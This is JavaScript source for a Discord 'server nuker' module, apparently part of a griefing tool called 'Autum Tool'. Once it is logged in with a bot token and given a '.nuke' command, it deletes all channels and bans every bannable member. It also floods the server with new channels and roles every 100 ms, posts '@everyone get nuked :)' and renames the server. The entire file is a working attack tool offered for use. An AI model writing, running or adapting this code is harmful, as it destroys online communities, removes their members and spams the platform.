const { Client, MessageEmbed } = require('discord.js');
const consoleTitle = require("console-title");
const moment = require("moment");
const settings = require('../module/selfbot.settings.js');
const gui = require("../module/gui");
const fs = require("fs");
const chalk = require("chalk");

let options = require("../module/settings");

const client = new Client();
const time = moment().format("HH:mm");
require("dotenv").config;


async function serverNuker() {
    console.clear();
    consoleTitle("Autum Tool - Nuker")
    gui()

    const readline = require('readline');

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('               Enter the bot\'s token: ', (token) => {

        let prefix = '.'

        client.once("ready", async () => {
            const chalk = require("chalk");
            const { table } = require("table");
            const data = [
                ["LOGGED IN AS", `${chalk.red.bold(client.user.tag)}`, "The user that I am logged in as."],
                ["SERVERS", `${chalk.yellow.bold(client.guilds.cache.size.toLocaleString())}`, "The amount of servers that I am in."],
                ["INFO", `To exit`, "Press CTRL + C 2 times"],
                ["PREFIX", `${chalk.cyan.bold(prefix)}`, "The prefix to use to run my commands"]
            ]

            consoleTitle(`Autum Tool - Nuker | Logged in as: ${client.user.tag}`)

            const config = {
                border: {
                    topBody: `─`,
                    topJoin: `┬`,
                    topLeft: `┌`,
                    topRight: `┐`,

                    bottomBody: `─`,
                    bottomJoin: `┴`,
                    bottomLeft: `└`,
                    bottomRight: `┘`,

                    bodyLeft: `│`,
                    bodyRight: `│`,
                    bodyJoin: `│`,

                    joinBody: `─`,
                    joinLeft: `├`,
                    joinRight: `┤`,
                    joinJoin: `┼`
                },
                header: {
                    alignment: 'center',
                    content: "CLIENT DATA"
                }
            };
            console.log(table(data, config))
        })

        client.on("message", async (message) => {
            if (message.content === prefix + "nuke" && message.author.id === settings.handler.ownerId) {
                if (message.guild.me.hasPermission(["MANAGE_CHANNELS", "MANAGE_ROLES", "BAN_MEMBERS"])) {
                    try {
                        message.delete();
                    } catch (e) {
                        console.log(e);
                    }
                    console.log(`${time} | ${chalk.green("[Command]")} .nuke`)
                    message.guild.channels.cache.forEach(channel => channel.delete().then(console.log(`${time} | ${chalk.red("[-]")} | Deleted Channel: ${channel.name}`)));

                    // try {
                    //     message.guild.roles.cache.forEach((role) => {
                    //         role.delete().then(role => console.log(`${time} | ${chalk.red("[-]")} | Deleted Role: ${role.name}`))
                    //     });
                    // } catch (e) {
                    //     throw e;
                    // }

                    let chName = options.nukeOptions.channelName;
                    let rName = options.nukeOptions.roleName;

                    if (!chName) chName = "Nuked";
                    if (!rName) rName = "LMFAO";

                    setInterval(async() => {
                        await message.guild.channels.create(chName, {
                            type: "text",
                        }).then(async(channel) => channel.send("@everyone get nuked :)") && console.log(`${time} | ${chalk.green("[+]")} | Created Channel: ${channel.name}`))
                    }, 100)

                    setInterval(async() => {
                        await message.guild.roles.create(rName).then(role => console.log(`${time} | ${chalk.green("[+]")} | Created Role: ${role.name}`));
                    }, 100)

                    await message.guild.members.fetch().then((members) => {
                        members.forEach((m) => {
                            if (m.bannable) {
                                setTimeout(() => {
                                    m.ban({ reason: "Nuked 🤪" })
                                    console.log(`${time} | ${chalk.red("[-]")} | Banned: ${m.user.tag}`)
                                }, 750)
                            }
                        })
                    })

                    const file_path = 'logs.txt';
                    const content = `Server Name: ${message.guild.name} \nId: ${message.guild.id} \nOwner Name: ${message.guild.owner.user.tag}\n--------------- Nuke Settings --------------\n\nBan Members: true\nDelete & Create Channels: True\nDelete & Create Roles: True\nChange Server Name: True`
                    fs.writeFileSync(file_path, content, (err) => {
                        if (err) return console.log(chak.red("Writing File Error: " + err))
                        console.log(greenBright("Successfully logged this nuke event:  " + file_path))
                    });

                    try {
                        if(message.guild.me.hasPermission("MANAGE_GUILD")) {
                            let serverName = options.nukeOptions.serverName;
                            if(!serverName) serverName = "lmao get nuked :)"
                            message.guild.setName(serverName)
                        }
                    } catch (err) {
                        throw err;
                    }

                } else {
                    console.log(`${time} | ${chalk.red("[Missing Permissions]")} I require the \`MANAGE_CHANNELS, MANAGE_ROLES, BAN_MEMBERS\` to execute this command.`)
                }
            }
        })

        client.login(token).catch(O_o => {
            console.clear();
            gui();
            console.log(`${time} | ${chalk.red("[Invalid Token]")} please provide a valid bot token.`);
        })
    });
}

module.exports = serverNuker;